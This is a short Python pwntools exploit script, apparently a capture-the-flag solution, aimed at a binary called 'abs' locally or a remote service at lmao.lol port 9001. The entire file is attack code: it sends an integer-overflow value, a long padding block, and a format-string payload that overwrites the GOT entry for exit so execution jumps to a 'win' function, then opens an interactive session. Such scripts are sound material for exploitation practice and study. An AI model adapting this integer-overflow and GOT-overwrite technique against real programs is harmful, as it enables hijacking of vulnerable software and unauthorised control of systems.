from pwn import *


def padding(size):
    return cyclic(size, alphabet=string.ascii_uppercase, n=8).encode()


context.arch = 'amd64'

# Set up remote or local process
if args.R:
    p = remote('lmao.lol', 9001)
elif args.H:
    p = process('./abs')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./abs',
                  gdbscript='''
                      b *main+296
                      c
                      ''')

# Address of win function
win_addr = 0x401196
# address of exit function
exit_addr = 0x404038
buf1 = 0x405940
buf2 = buf1 + 8

## step1: integer overflow
overflow_payload = b'2147483519'

##  got exit hijacking to win func
payload = (b"%4500c..")  # 10th
payload += (b"%12$hn..")  # 11th
payload += p64(exit_addr)  # 12th

p.sendlineafter(': ', overflow_payload + padding(5894)
                + p64(buf1) + p64(buf2)
                + payload
                )
p.interactive()
